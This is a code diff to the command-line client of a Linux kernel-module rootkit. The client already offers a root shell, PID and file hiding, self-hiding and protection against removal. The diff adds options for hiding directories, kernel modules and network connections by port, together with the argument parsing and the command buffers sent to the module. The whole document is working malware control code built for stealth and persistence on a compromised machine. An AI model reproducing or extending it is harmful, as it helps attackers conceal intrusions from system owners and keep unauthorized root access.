@@ -32,22 +32,32 @@ void print_help(char **argv)
         "Usage: %s [OPTION]...\n"
         "\n"
         "Options:\n"
-        "  --root-shell            Grants you root shell access.\n"
-        "  --hide-pid=PID          Hides the specified PID.\n"
-        "  --unhide-pid=PID        Unhides the specified PID.\n"
-        "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
-        "                          Must be a filename without any path.\n"
-        "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
-        "  --hide                  Hides the rootkit LKM.\n"
-        "  --unhide                Unhides the rootkit LKM.\n"
-        "  --help                  Print this help message.\n"
-        "  --protect               Protects the rootkit from rmmod.\n"
-        "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
+        "  --root-shell                Grants you root shell access.\n"
+        "  --hide-pid=PID              Hides the specified PID.\n"
+        "  --unhide-pid=PID            Unhides the specified PID.\n"
+        "  --hide-file=FILENAME        Hides the specified FILENAME globally.\n"
+        "                              Must be a filename without any path.\n"
+        "  --unhide-file=FILENAME      Unhides the specified FILENAME.\n"
+        "  --hide-dir=DIRNAME          Hides the specified DIRNAME globally.\n"
+        "                              Must be a directory name without any path.\n"
+        "  --unhide-dir=DIRNAME        Unhides the specified DIRNAME.\n"
+        "  --hide-module=MODULE        Hides the specified kernel MODULE.\n"
+        "  --unhide-module=MODULE      Unhides the specified kernel MODULE.\n"
+        "  --hide-connection=PORT      Hides connections on specified PORT.\n"
+        "  --unhide-connection=PORT    Unhides connections on specified PORT.\n"
+        "  --hide                      Hides the rootkit LKM.\n"
+        "  --unhide                    Unhides the rootkit LKM.\n"
+        "  --help                      Print this help message.\n"
+        "  --protect                   Protects the rootkit from rmmod.\n"
+        "  --unprotect                 Disables the rmmod protection.\n\n", argv[0]);
 }
 
 void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
                                    int *unhide_pid, char **pid, int *hide_file,
-                                   int *unhide_file, char **file, int *hide,
+                                   int *unhide_file, char **file, int *hide_dir,
+                                   int *unhide_dir, char **dir, int *hide_module,
+                                   int *unhide_module, char **module, int *hide_connection,
+                                   int *unhide_connection, char **connection, int *hide,
                                    int *unhide, int *protect, int *unprotect)
 {
     if (argc < 2) {
@@ -59,17 +69,23 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     opterr = 0;
 
     static struct option long_options[] = {
-        {"root-shell",  no_argument,       0, 'a'},
-        {"hide-pid",    required_argument, 0, 'b'},
-        {"unhide-pid",  required_argument, 0, 'c'},
-        {"hide-file",   required_argument, 0, 'd'},
-        {"unhide-file", required_argument, 0, 'e'},
-        {"hide",        no_argument,       0, 'f'},
-        {"unhide",      no_argument,       0, 'g'},
-        {"help",        no_argument,       0, 'h'},
-        {"protect",     no_argument,       0, 'i'},
-        {"unprotect",   no_argument,       0, 'j'},
-        {0,             0,                 0,  0 }
+        {"root-shell",        no_argument,       0, 'a'},
+        {"hide-pid",          required_argument, 0, 'b'},
+        {"unhide-pid",        required_argument, 0, 'c'},
+        {"hide-file",         required_argument, 0, 'd'},
+        {"unhide-file",       required_argument, 0, 'e'},
+        {"hide-dir",          required_argument, 0, 'o'},
+        {"unhide-dir",        required_argument, 0, 'p'},
+        {"hide-module",       required_argument, 0, 'k'},
+        {"unhide-module",     required_argument, 0, 'l'},
+        {"hide-connection",   required_argument, 0, 'm'},
+        {"unhide-connection", required_argument, 0, 'n'},
+        {"hide",              no_argument,       0, 'f'},
+        {"unhide",            no_argument,       0, 'g'},
+        {"help",              no_argument,       0, 'h'},
+        {"protect",           no_argument,       0, 'i'},
+        {"unprotect",         no_argument,       0, 'j'},
+        {0,                   0,                 0,  0 }
     };
 
     *root = 0;
@@ -79,6 +95,15 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     *hide_file = 0;
     *unhide_file = 0;
     *file = NULL;
+    *hide_dir = 0;
+    *unhide_dir = 0;
+    *dir = NULL;
+    *hide_module = 0;
+    *unhide_module = 0;
+    *module = NULL;
+    *hide_connection = 0;
+    *unhide_connection = 0;
+    *connection = NULL;
     *hide = 0;
     *unhide = 0;
     *protect = 0;
@@ -114,6 +139,36 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
                 *file = optarg;
                 break;
 
+            case 'o':
+                *hide_dir = 1;
+                *dir = optarg;
+                break;
+
+            case 'p':
+                *unhide_dir = 1;
+                *dir = optarg;
+                break;
+
+            case 'k':
+                *hide_module = 1;
+                *module = optarg;
+                break;
+
+            case 'l':
+                *unhide_module = 1;
+                *module = optarg;
+                break;
+
+            case 'm':
+                *hide_connection = 1;
+                *connection = optarg;
+                break;
+
+            case 'n':
+                *unhide_connection = 1;
+                *connection = optarg;
+                break;
+
             case 'f':
                 *hide = 1;
                 break;
@@ -146,8 +201,9 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
         }
     }
 
-    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
-            + *unhide + *protect + *unprotect) != 1) {
+    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide_dir + 
+         *unhide_dir + *hide_module + *unhide_module + *hide_connection + 
+         *unhide_connection + *hide + *unhide + *protect + *unprotect) != 1) {
         fprintf(stderr, "Error: Exactly one option should be specified\n\n");
         print_help(argv);
         exit(1);
@@ -169,14 +225,25 @@ int main(int argc, char **argv)
     int hide_file;
     int unhide_file;
     char *file;
+    int hide_dir;
+    int unhide_dir;
+    char *dir;
+    int hide_module;
+    int unhide_module;
+    char *module;
+    int hide_connection;
+    int unhide_connection;
+    char *connection;
     int hide;
     int unhide;
     int protect;
     int unprotect;
 
     handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
-                                  &hide_file, &unhide_file, &file, &hide, &unhide,
-                                  &protect, &unprotect);
+                                  &hide_file, &unhide_file, &file, &hide_dir, 
+                                  &unhide_dir, &dir, &hide_module, &unhide_module, 
+                                  &module, &hide_connection, &unhide_connection, 
+                                  &connection, &hide, &unhide, &protect, &unprotect);
 
     size_t buf_size = 0;
 
@@ -192,6 +259,18 @@ int main(int argc, char **argv)
         buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
     } else if (unhide_file) {
         buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
+    } else if (hide_dir) {
+        buf_size += sizeof(CFG_HIDE_DIR) + strlen(dir);
+    } else if (unhide_dir) {
+        buf_size += sizeof(CFG_UNHIDE_DIR) + strlen(dir);
+    } else if (hide_module) {
+        buf_size += sizeof(CFG_HIDE_MODULE) + strlen(module);
+    } else if (unhide_module) {
+        buf_size += sizeof(CFG_UNHIDE_MODULE) + strlen(module);
+    } else if (hide_connection) {
+        buf_size += sizeof(CFG_HIDE_CONNECTION) + strlen(connection);
+    } else if (unhide_connection) {
+        buf_size += sizeof(CFG_UNHIDE_CONNECTION) + strlen(connection);
     } else if (hide) {
         buf_size += sizeof(CFG_HIDE);
     } else if (unhide) {
@@ -225,6 +304,24 @@ int main(int argc, char **argv)
     } else if (unhide_file) {
         write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
         write_buffer(&buf_ptr, file, strlen(file));
+    } else if (hide_dir) {
+        write_buffer(&buf_ptr, CFG_HIDE_DIR, sizeof(CFG_HIDE_DIR));
+        write_buffer(&buf_ptr, dir, strlen(dir));
+    } else if (unhide_dir) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_DIR, sizeof(CFG_UNHIDE_DIR));
+        write_buffer(&buf_ptr, dir, strlen(dir));
+    } else if (hide_module) {
+        write_buffer(&buf_ptr, CFG_HIDE_MODULE, sizeof(CFG_HIDE_MODULE));
+        write_buffer(&buf_ptr, module, strlen(module));
+    } else if (unhide_module) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_MODULE, sizeof(CFG_UNHIDE_MODULE));
+        write_buffer(&buf_ptr, module, strlen(module));
+    } else if (hide_connection) {
+        write_buffer(&buf_ptr, CFG_HIDE_CONNECTION, sizeof(CFG_HIDE_CONNECTION));
+        write_buffer(&buf_ptr, connection, strlen(connection));
+    } else if (unhide_connection) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_CONNECTION, sizeof(CFG_UNHIDE_CONNECTION));
+        write_buffer(&buf_ptr, connection, strlen(connection));
     } else if (hide) {
         write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
     } else if (unhide) {
